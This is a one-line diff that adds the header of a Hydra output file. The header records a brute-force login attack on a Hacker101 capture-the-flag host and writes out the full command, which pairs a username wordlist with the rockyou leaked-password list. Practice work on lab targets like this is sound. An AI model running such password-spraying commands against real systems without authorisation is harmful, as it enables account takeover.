@@ -1,0 +1,1 @@
+# Hydra v9.4 run at 2024-08-04 10:16:41 on 4aca7d970cd76bb3d868f6110825662a.ctf.hacker101.com http-post (hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -o test_hydra_cmv2.txt -v 4aca7d970cd76bb3d868f6110825662a.ctf.hacker101.com http-post)
